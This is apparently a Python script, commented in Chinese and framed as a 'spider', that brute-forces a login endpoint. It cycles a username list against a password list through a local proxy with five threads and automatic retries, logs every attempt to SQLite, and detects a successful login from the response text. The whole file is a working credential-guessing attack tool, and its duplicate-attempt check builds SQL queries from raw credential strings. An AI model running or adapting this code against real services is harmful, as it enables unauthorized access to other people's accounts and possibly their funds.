import json
import logging
import requests
import tenacity
import SpiderDb
from concurrent.futures import ThreadPoolExecutor
import threading



class Spider:
    def __init__(self, usernames, passwords, proxy, url, data, time_sleep):
        self.usernames = usernames
        self.passwords = passwords
        self.db = SpiderDb.SpiderDB(save_path='spider.db')
        self.headers = None
        self.proxy = proxy
        self.url = url
        self.data = data
        self.time_sleep = time_sleep
        self.pool = ThreadPoolExecutor(max_workers=5)
        self.lock = threading.Lock()

    # 插入请求数据到数据库
    def insert_request(self, this_url, this_user, this_pwd):
        with self.lock:
            self.db.insert_request_data(this_url, 'post', str(self.headers), this_user, this_pwd)
            request_id = self.db.conn.execute("SELECT last_insert_rowid()").fetchone()[0]
            return request_id

    # 插入响应数据到数据库
    def insert_response(self, request_id, status_code, this_data, this_text, this_title, this_url):
        with self.lock:
            self.db.insert_response_data(request_id, status_code=status_code,
                                         headers=str(this_data),
                                         content=this_text, title=this_title, url=this_url)

    # 使用tenacity库进行异常自动重试
    @tenacity.retry(wait=tenacity.wait_fixed(5), stop=tenacity.stop_after_attempt(3),
                    retry=tenacity.retry_if_exception_type(requests.exceptions.RequestException))
    def get_response(self, this_username, this_password):
        data = self.data.copy()
        data.update({'name': this_username, 'pwd': this_password, 'act': 'getmoney'})

        # 检查用户名和密码是否已经被尝试过，如果是则跳过
        if self.check_pass(this_username=this_username, this_password=this_password):
            print(f"{this_username} {this_password} 跳过")
            return False

        try:
            # 发送HTTP请求，并检查响应状态码
            res = requests.get(proxies=self.proxy, url=self.url, headers=self.headers, params=data, timeout=10)
            res.raise_for_status()
        except requests.exceptions.RequestException as e:
            # 捕获并记录异常信息
            logging.error(f"请求失败：{e}")
            return False

        # 记录HTTP请求和响应数据到数据库
        print(f"状态码：{res.status_code} URL: {res.url}")
        this_id = self.insert_request(this_url=self.url, this_pwd=this_password, this_user=this_username)
        self.insert_response(this_url=self.url, this_data=json.dumps(data), status_code=res.status_code,
                             this_text=res.text, this_title='', request_id=this_id)

        # 判断是否登录成功
        if '"code":5' not in res.text and '|' in res.text:
            print(f"{this_username} {this_password} 成功！！！")
            return True
        return False

    # 检查用户名和密码是否已经被尝试过
    def check_pass(self, this_username, this_password):

        data = self.data.copy()
        data.update({'name': this_username, 'pwd': this_password, 'act': 'getmoney'})
        with self.lock:
            row = self.db.conn.execute(
                f"SELECT id FROM request_data WHERE user='{this_username}' and pwd='{this_password}'").fetchone()
        return row is not None

    # 主函数
    def main(self):
        for username in self.usernames:
            res_list = [self.pool.submit(self.get_response, username, password) for password in passwords]
            for result in res_list:
                success = result.result()
                if success:
                    break
        self.db.close()


if __name__ == '__main__':
    # 配置日志文件和日志级别
    logging.basicConfig(filename='error.log', level=logging.ERROR)

    # 读取用户名和密码列表
    with open('usernames.txt') as f:
        usernames = [line.strip() for line in f]
    with open('pwd.txt') as f:
        passwords = [line.strip() for line in f]

    # 初始化爬虫对象
    spider = Spider(
        proxy={'https': 'http://localhost:8889', 'http': 'http://localhost:8889'},
        url='https:',
        usernames=usernames,
        passwords=passwords,
        time_sleep=0.1,
        data={'name': '', 'pwd': '', 'act': ''}
    )
    # 启动爬虫
    spider.main()
